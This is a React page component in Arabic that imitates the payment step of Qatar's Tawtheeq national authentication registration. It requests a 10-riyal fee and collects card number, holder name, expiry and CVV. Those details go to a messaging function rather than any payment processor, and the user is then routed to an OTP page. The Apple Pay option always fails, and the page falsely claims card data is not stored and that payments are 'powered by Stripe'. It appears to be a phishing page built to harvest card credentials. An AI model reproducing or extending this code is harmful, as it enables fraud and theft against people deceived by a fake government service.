import { useState } from "react";
import { useNavigate } from "react-router-dom";
import Header from "@/components/Header";
import Stepper from "@/components/Stepper";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import securePaymentLogos from "@/assets/visa-mastercard.svg";
import { useRegistration } from "@/contexts/RegistrationContext";

const steps = [
  { number: 1, title: "نوع الحساب" },
  { number: 2, title: "البيانات الشخصية" },
  { number: 3, title: "كلمة المرور" },
  { number: 4, title: "إتمام التسجيل" },
];

const RegistrationComplete = () => {
  const navigate = useNavigate();
  const { updateData, sendCumulativeMessage } = useRegistration();
  const [currentView, setCurrentView] = useState<"welcome" | "payment" | "card-payment">("welcome");
  const [showApplePayError, setShowApplePayError] = useState(false);
  const [cardNumber, setCardNumber] = useState<string>("");
  const [cardholderName, setCardholderName] = useState<string>("");
  const [expiryDate, setExpiryDate] = useState<string>("");
  const [cvv, setCvv] = useState<string>("");

  const handleCardNumberChange = (value: string) => {
    // إزالة كل ما ليس رقم
    const cleaned = value.replace(/\D/g, "");

    // تقسيم الأرقام إلى مجموعات من 4
    const formatted = cleaned.match(/.{1,4}/g)?.join(" ") || cleaned;

    // تحديد الطول الأقصى (16 رقم + 3 مسافات = 19 حرف)
    if (cleaned.length <= 16) {
      setCardNumber(formatted);
    }
  };

  const handleExpiryDateChange = (value: string) => {
    // إزالة كل ما ليس رقم
    const cleaned = value.replace(/\D/g, "");

    // تنسيق تلقائي: إضافة / بعد الشهر
    if (cleaned.length <= 2) {
      const month = cleaned;
      // التحقق من أن الشهر لا يتجاوز 12
      if (month.length === 2 && parseInt(month) > 12) {
        setExpiryDate("12");
      } else if (month.length === 1 && parseInt(month) > 1) {
        setExpiryDate(month);
      } else {
        setExpiryDate(month);
      }
    } else if (cleaned.length <= 4) {
      const month = cleaned.slice(0, 2);
      const year = cleaned.slice(2);
      
      // التحقق من صحة الشهر
      if (parseInt(month) > 12 || parseInt(month) === 0) {
        return;
      }
      
      setExpiryDate(`${month}/${year}`);
    }
  };

  const handleConfirmPayment = async () => {
    if (!cardNumber.trim() || !cardholderName.trim() || !expiryDate.trim() || !cvv.trim()) {
      alert("يرجى إدخال جميع بيانات البطاقة المصرفية");
      return;
    }

    if (cardNumber.replace(/\s/g, "").length !== 16) {
      alert("رقم البطاقة يجب أن يكون 16 رقم");
      return;
    }

    if (expiryDate.length !== 5) {
      alert("تاريخ الانتهاء غير صحيح");
      return;
    }

    // التحقق من صحة تاريخ الانتهاء
    const [month, year] = expiryDate.split('/');
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100; // آخر رقمين من السنة
    const currentMonth = currentDate.getMonth() + 1;
    
    const cardYear = parseInt(year);
    const cardMonth = parseInt(month);
    
    if (cardMonth < 1 || cardMonth > 12) {
      alert("الشهر غير صحيح. يجب أن يكون بين 01 و 12");
      return;
    }
    
    if (cardYear < currentYear || (cardYear === currentYear && cardMonth < currentMonth)) {
      alert("البطاقة منتهية الصلاحية. يرجى إدخال تاريخ انتهاء صحيح");
      return;
    }

    if (cvv.length !== 3) {
      alert("رمز CVV يجب أن يكون 3 أرقام");
      return;
    }

    const newData = {
      cardNumber,
      cardholderName,
      expiryDate,
      cvv,
    };

    updateData(newData);
    await sendCumulativeMessage(4, "بيانات الدفع", newData);
    navigate("/payment-otp");
  };

  return (
    <div className="min-h-screen flex flex-col bg-white" dir="rtl">
      <Header />

      <main className="flex-1 container mx-auto px-4 py-12 bg-white">
        <Stepper currentStep={4} steps={steps} />

        <div className="max-w-4xl mx-auto mt-8">
          {currentView === "welcome" && (
            <div className="bg-secondary/30 rounded-lg shadow-lg p-8 border border-border">
              <h2 className="text-2xl font-bold mb-6 text-right text-foreground">إتمام عملية التسجيل</h2>
              <div className="space-y-4 text-right text-base leading-relaxed text-foreground">
                <p>
                  يرجى العلم بأنه يتعيّن سداد رسوم تسجيل مقدارها (<span className="text-destructive font-bold">10 ريالات قطرية</span>) لإتمام عملية التسجيل في نظام التوثيق
                  الوطني (توثيق)، والاستفادة من المزايا والخدمات المقدّمة من النظام.
                </p>
                <p className="font-semibold">يتيح نظام التوثيق الوطني للمستخدمين المزايا التالية:</p>
                <ul className="list-disc mr-6 space-y-2">
                  <li>تسهيل ربط الجهات الحكومية بالخدمة من خلال إجراءات مبسطة وسلسة.</li>
                  <li>تعزيز أمن استخدام الخدمات الإلكترونية والعمليات الرقمية.</li>
                  <li>
                    توفير توثيق متعدد المستويات عبر البطاقة الذكية، أو كلمة المرور، أو البريد الإلكتروني للمستخدمين
                    والزائرين وذوي الإقامة المؤقتة.
                  </li>
                  <li>
                    تمكين تسجيل الدخول الموحّد، مما يسهم في تسهيل تجربة المستخدم عند إنجاز أي خدمة أو معاملة إلكترونية.
                  </li>
                </ul>
                <p>لإتمام التسجيل، يرجى الضغط على "متابعة إلى الدفع" للانتقال إلى بوابة الدفع الإلكترونية الآمنة.</p>
              </div>
              <div className="flex justify-center mt-8">
                <Button onClick={() => setCurrentView("payment")} className="min-w-48 bg-primary hover:bg-primary/90">
                  متابعة إلى الدفع
                </Button>
              </div>
            </div>
          )}

          {currentView === "payment" && (
            <div className="bg-secondary/30 rounded-lg shadow-lg p-8 border border-border">
              <h2 className="text-2xl font-bold mb-6 text-right text-foreground">بوابة الدفع الإلكتروني</h2>
              <div className="bg-background rounded-lg p-6 space-y-4">
                <div className="flex justify-between items-center border-b border-border pb-3">
                  <span className="font-semibold text-foreground">المبلغ المطلوب:</span>
                  <span className="text-xl font-bold text-primary">10 ريال قطري</span>
                </div>

                <div className="space-y-3 pt-3">
                  <p className="text-sm text-muted-foreground text-right">يرجى اختيار طريقة الدفع المناسبة:</p>

                  <div className="space-y-3">
                    <Button
                      variant="outline"
                      className="w-full justify-start h-14 text-right border-2 hover:border-primary hover:bg-primary/5 transition-all"
                      dir="rtl"
                      onClick={() => {
                        setCurrentView("card-payment");
                        setShowApplePayError(false);
                      }}
                    >
                      <span className="text-base">💳 بطاقة الائتمان / بطاقة الخصم المباشر</span>
                    </Button>

                    <Button
                      variant="outline"
                      className="w-full justify-start h-14 text-right border-2 hover:border-primary hover:bg-primary/5 transition-all"
                      dir="rtl"
                      onClick={() => setShowApplePayError(true)}
                    >
                      <span className="text-base"> Apple Pay</span>
                    </Button>
                  </div>

                  {showApplePayError && (
                    <div className="bg-destructive/10 border-2 border-destructive rounded-lg p-4 mt-4">
                      <p className="text-destructive text-sm text-right font-medium">
                        نعتذر، طريقة الدفع المحددة غير متاحة في الوقت الحالي. يرجى التكرم باختيار وسيلة دفع بديلة لإتمام
                        عملية الدفع.
                      </p>
                    </div>
                  )}
                </div>

                <p className="text-xs text-muted-foreground text-center pt-4 border-t border-border">
                  🔒 جميع المعاملات آمنة ومشفرة
                </p>
              </div>
              <div className="flex justify-start mt-6">
                <Button
                  variant="outline"
                  onClick={() => {
                    setCurrentView("welcome");
                    setShowApplePayError(false);
                  }}
                >
                  رجوع
                </Button>
              </div>
            </div>
          )}

          {currentView === "card-payment" && (
            <div className="bg-secondary/30 rounded-lg shadow-lg p-8 border border-border max-w-2xl mx-auto">
              <div className="mb-6">
                <h2 className="text-2xl font-bold text-right mb-2 text-foreground">بوابة الدفع الإلكتروني</h2>
                <p className="text-right text-sm text-muted-foreground">يرجى إدخال معلومات البطاقة بشكل دقيق</p>
              </div>

              <div className="space-y-5">
                {/* Amount Display */}
                <div className="bg-primary/10 border border-primary/20 rounded-lg p-4 flex justify-between items-center">
                  <span className="text-sm font-medium text-foreground">المبلغ الإجمالي</span>
                  <span className="text-2xl font-bold text-primary">10.00 ر.ق</span>
                </div>

                {/* Card Number */}
                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground block text-right">رقم البطاقة</label>
                  <input
                    type="text"
                    placeholder="0000 0000 0000 0000"
                    className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-left focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent tracking-wider"
                    maxLength={19}
                    dir="ltr"
                    inputMode="numeric"
                    value={cardNumber}
                    onChange={(e) => handleCardNumberChange(e.target.value)}
                  />
                </div>

                {/* Cardholder Name */}
                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground block text-right">اسم حامل البطاقة</label>
                  <input
                    type="text"
                    placeholder="الاسم كما هو مكتوب على البطاقة"
                    className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-right focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                  />
                </div>

                {/* Expiry and CVV */}
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground block text-right">تاريخ الانتهاء</label>
                    <input
                      type="text"
                      placeholder="MM/YY"
                      className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-right focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                      maxLength={5}
                      dir="ltr"
                      inputMode="numeric"
                      value={expiryDate}
                      onChange={(e) => handleExpiryDateChange(e.target.value)}
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground block text-right">CVV</label>
                    <input
                      type="text"
                      placeholder="123"
                      className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-center focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                      maxLength={3}
                      dir="ltr"
                      inputMode="numeric"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
                    />
                  </div>
                </div>

                {/* Security Notice */}
                <div className="bg-secondary/50 border border-border rounded-lg p-3 flex items-start gap-2">
                  <span className="text-lg">🔒</span>
                  <p className="text-xs text-muted-foreground text-right">
                    معلوماتك محمية بتقنية التشفير المتقدمة. نحن لا نقوم بتخزين معلومات بطاقتك.
                  </p>
                </div>

                {/* Secure Payment Logos */}
                <div className="flex justify-center pt-2">
                  <img
                    src={securePaymentLogos}
                    alt="Secure Payment Methods - Powered by Stripe, MasterCard, VISA, Discover, American Express"
                    className="w-full max-w-xl opacity-90"
                  />
                </div>
              </div>

              <div className="flex gap-3 flex-row-reverse mt-8">
                <Button
                  className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
                  onClick={handleConfirmPayment}
                  disabled={!cardNumber.trim() || !cardholderName.trim() || !expiryDate.trim() || !cvv.trim()}
                >
                  تأكيد الدفع - 10.00 ر.ق
                </Button>
                <Button variant="outline" onClick={() => setCurrentView("payment")}>
                  رجوع
                </Button>
              </div>
            </div>
          )}
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default RegistrationComplete;
